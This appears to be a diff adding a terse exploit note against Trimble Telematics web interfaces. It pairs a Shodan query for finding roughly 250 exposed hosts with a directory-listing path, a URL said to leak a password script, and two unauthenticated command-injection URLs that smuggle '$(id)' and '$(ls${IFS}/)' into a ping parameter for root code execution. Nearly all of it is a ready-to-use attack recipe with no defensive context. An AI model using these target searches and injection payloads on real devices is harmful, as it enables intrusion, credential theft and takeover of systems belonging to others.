@@ -1,0 +1,14 @@
+shodan == title:"Trimble Telematics - System Information"
+
+~250 hosts
+
+directory listing:
+http://xxx/device/ 
+
+password leak :
+http://xxx/device/webToolPass.sh 
+
+unauth root rce :
+
+http://xxx/lualibs/ajaxQuery.cgi?ping=127.0.0.1'';$(id);&_=1639963030330 
+http://xxx/lualibs/ajaxQuery.cgi?ping=127.0.0.1'';$(ls${IFS}/);&_=1639963030330 
